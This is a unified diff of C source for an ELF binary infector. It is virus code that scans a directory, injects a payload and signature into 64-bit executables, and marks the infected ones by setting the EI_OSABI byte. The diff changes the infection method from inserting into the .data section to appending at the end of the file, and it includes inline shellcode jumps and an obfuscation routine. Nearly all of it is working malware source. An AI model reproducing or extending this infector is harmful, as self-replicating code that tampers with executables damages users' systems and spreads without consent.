@@ -5,7 +5,7 @@ static void  start(void) {}
 
 #include "shellcode.h"
 
-asm("int3");
+asm("pushfq");
 int   entry_point(void *magic) {
   int     ret;
   char    infectDir[] = "/tmp/test";
@@ -24,7 +24,8 @@ int   entry_point(void *magic) {
   if (infectBins(infectDir) == -1)
     return (stop(1, magic));
   /* if (infectBins(infectDir2) == -1) */
-  /*   return (stop(1, magic)); */
+    /* exit(1); */
+  return (stop(0, magic));
   exit(0);
 }
 
@@ -33,6 +34,7 @@ static int   stop(int status, void *magic) {
     return (status);
   asm("leave\n\t"
       "leave\n\t"
+      "popfq\n\t"
       "mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
@@ -40,6 +42,9 @@ static int   stop(int status, void *magic) {
       "mov $0, %rdi\n\t"
       "mov $0, %rax\n\t"
       "mov $0, %rbp\n\t"
+      "mov $0,%r8\n\t"
+      "mov $0, %r10\n\t"
+      "mov $0, %r11\n\t"
       "jmp endSC");
   return (status);
 }
@@ -492,10 +497,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     close(fd);
     return (1);
   }
-  data = getDataSectionHeader((void *)tmp);
   len = strlen(payload) + sizeof(size_t) + 1;
-  if (len != (len & -16))
-    len = (len & -16) + 16;
   if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) < 0) {
     close(fd);
     munmap(tmp, stats.st_size);
@@ -535,29 +537,15 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     }
 }
 
-static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
-  Elf64_Shdr  *pointer;
-  Elf64_Shdr  *shstrHeader;
-  char        dataName[] = ".data";
-
-  pointer = ((void *)header) + header->e_shoff;
-  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
-  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
-    pointer += 1;
-  return (pointer);
-}
-
-static void  appendSignature(struct bfile file, size_t offset) {
-  size_t  toAdd;
-  size_t  aligned;
-
+static void  appendSignature(struct bfile file) {
+  size_t  len;
   char payload[] = PAYLOAD;
-  toAdd = strlen(payload) + 1 + sizeof(size_t);
-  aligned = toAdd != (toAdd & -16) ? (toAdd & -16) + 16 : toAdd;
-  memmove(((void *)file.header) + offset + aligned, ((void *)file.header) + offset, file.size - offset - aligned);
-  memcpy(((void *)file.header) + offset, payload, strlen(payload));
-  memcpy(((void *)file.header) + offset + strlen(payload), (void *)dynamicSignature + 4, sizeof(size_t));
-  memset(((void *)file.header) + offset + strlen(payload) + sizeof(size_t), 0, aligned - toAdd);
+
+  len = strlen(payload);
+  memcpy(((void *)file.header) + file.size, payload, len);
+  memcpy(((void *)file.header) + file.size + len, (void *)dynamicSignature + 4, sizeof(size_t));
+  memset(((void *)file.header) + file.size + len + sizeof(size_t), 0, 1);
+  file.header->e_ident[EI_OSABI] = 0x10;
 }
 
 static void obfuscate(char *header, size_t size) {
@@ -574,9 +562,9 @@ const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = 
   /* "\x55\x48\x89\xe5\x48\x83", */
   /* "\xcc\xcc\xcc\xcc\xcc\xcc", */
   /* "" */
-  "\x55\x48\x89\xe5",
-  "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5",
-  ""
+  /* "\x55\x48\x89\xe5", */
+  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5", */
+  /* "" */
   /* "\xcc", */
   /* "\x90", */
   /* "", */
@@ -687,32 +675,10 @@ segment != ((void *)bin->header) + bin->header->e_phoff + bin->header->e_phnum *
 }
 
 static int  infectFile(struct bfile bin) {
-  size_t      len;
-  size_t      size;
-  Elf64_Phdr  *seg;
-  Elf64_Shdr  *data;
-  Elf64_Off   offset;
-
   char payload[] = PAYLOAD;
-  len = strlen(payload) + sizeof(size_t) + 1;
-  data = getDataSectionHeader(bin.header);
-  if (len != (len & -16))
-    len = (len & -16) + 16;
-  offset = data->sh_offset;
-  size = data->sh_size;
-  appendSignature(bin, offset + size);
-  updateOffsets(bin.header, offset + size, len);
-  data = getDataSectionHeader(bin.header);
-  seg = ((void *)bin.header) + bin.header->e_phoff;
-  while (seg != ((void *)bin.header) + bin.header->e_phoff + bin.header->e_phnum * sizeof(Elf64_Phdr)) {
-    if (seg->p_offset <= data->sh_offset &&
-      seg->p_offset + seg->p_filesz >= data->sh_offset + data->sh_size) {
-      seg->p_filesz += len;
-      seg->p_memsz += len;
-    }
-    seg += 1;
-  }
-  data->sh_size += len;
+
+  appendSignature(bin);
+  bin.size += strlen(payload) + sizeof(size_t) + 1;
   if (appendCode(&bin) == -1) {
     munmap(bin.header, bin.size);
     return (-1);
@@ -731,15 +697,7 @@ static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine)
 }
 
 static int  isInfected(struct bfile bin) {
-  Elf64_Shdr  *data;
-  char    payload[] = PAYLOAD;
-  size_t  len;
-
-  len = strlen(payload) + sizeof(size_t) + 1;
-  if (len != (len & -16))
-    len = (len & -16) + 16;
-  data = getDataSectionHeader(bin.header);
-  return ((strncmp((char *)(((void *)bin.header) + data->sh_offset + data->sh_size - len), payload, strlen(payload))) == 0);
+  return bin.header->e_ident[EI_OSABI] == 0x10;
 }
 
 static int  infectBins(const char *dirname) {
